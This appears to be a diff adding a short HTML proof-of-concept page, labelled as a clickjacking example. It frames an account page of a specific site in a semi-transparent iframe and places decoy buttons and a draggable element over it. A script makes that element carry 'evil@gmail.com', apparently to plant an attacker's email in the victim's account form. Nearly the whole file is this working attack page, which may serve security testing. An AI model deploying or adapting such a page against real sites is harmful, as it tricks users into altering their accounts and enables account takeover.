@@ -1,0 +1,33 @@
+<html>
+    <head>
+            <title>Test</title>
+    </head>
+    <body>
+
+    This is a clickjacking example
+    <iframe id="top" src="https://adiuatindcentral2018.com/adidas/account/showAccount.do?execution=e2s1" width="100%" height="500"></iframe>
+    <img src="x" width=30 height=30 style="position: absolute; top: 120px; left: 320px;background-color:red;" /> 
+
+    <div id=bottom style="position: absolute; top: 520px;background-color:red;">
+        <div draggable="true">Drag me to the dog and do single click</div>
+    </div>
+
+    <input type="button" id=submit value="Go!">
+
+    <style type="text/css">     
+        #bottom {position: absolute; top:0px; left:0px; opacity:1.0;} 
+        #top    {position: absolute; top:0px; left:0px; opacity:0.3}
+        #submit {position: absolute; top:290px; left:950px; background-color:red;}
+    </style> 
+    <script>
+    window.onload=function() {
+        var dragItems = document.querySelectorAll('[draggable=true]');
+        for (var i = 0; i < dragItems.length; i++) {
+          dragItems[i].addEventListener('dragstart', function (event) {
+            event.dataTransfer.setData('Text', 'evil@gmail.com');
+          });
+        }
+    };
+    </script>
+    </body>
+    </html>
